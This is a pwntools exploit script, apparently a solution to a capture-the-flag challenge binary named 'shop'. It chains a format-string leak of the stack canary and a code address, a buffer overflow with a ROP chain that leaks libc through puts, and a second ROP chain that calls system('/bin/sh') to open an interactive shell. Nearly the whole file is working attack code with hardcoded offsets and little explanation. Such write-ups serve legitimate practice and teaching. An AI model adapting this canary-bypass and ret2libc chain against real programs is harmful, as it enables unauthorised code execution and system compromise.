from pwn import *

context.binary = 'shop'
elf = ELF('shop')
rop = ROP(elf)
io = process()

# offsets of addresses cuz there is ASLR
main_offset = 0x11e0
puts_plt_offset = 0x1040
getchar_got_offset = 0x4030
getchar_libc_offset = 0x86380
bin_sh_offset = 0x1a7e43
system_offset = 0x528f0
pop_rdi_offset = 0x11cc
ret_offset = 0x1016

io.sendline(b'%17$p.%13$p')
io.recvuntil(b'Welcome, ')

leak_line = io.recvline().strip()

# Split into two parts
main_str, canary_str = leak_line.split(b'.')

# Convert from bytes to int
main = int(main_str, 16)
canary = int(canary_str, 16)

print('the main functions is : ',hex(main))
print('the canary is : ',hex(canary))

# actual address of functions and gadgets
binary_base = main - main_offset
getchar = getchar_got_offset + binary_base
puts = puts_plt_offset + binary_base
pop_rdi = pop_rdi_offset + binary_base
ret = ret_offset + binary_base

# leaking the libc base address with puts
io.sendline(b'4')

payload = b'Y' * 104
payload += p64(canary)
payload += b'YYYYYYYY'
payload += p64(pop_rdi)
payload += p64(getchar)
#payload += p64(ret)
payload += p64(puts)
payload += p64(main)

io.sendline(payload)

io.recvuntil(b"------------------------------------------------")
io.recvline()
io.recvline()

getchar_libc = u64(io.recvline().strip().ljust(8, b"\x00"))

libc_base = getchar_libc - getchar_libc_offset
system_address = libc_base + system_offset
bin_sh_address = libc_base + bin_sh_offset

print("libc base : ",hex(libc_base))
print("system : ",hex(system_address))
print("/bin/sh : ",hex(bin_sh_address))


io.sendline(b'yassine')
sleep(0.1)
io.sendline(b'4')

payload = b'Y' * 104
payload += p64(canary)
payload += b'A' * 8
payload += p64(pop_rdi)
payload += p64(bin_sh_address)
payload += p64(ret)
payload += p64(system_address)

io.sendline(payload)

io.interactive()
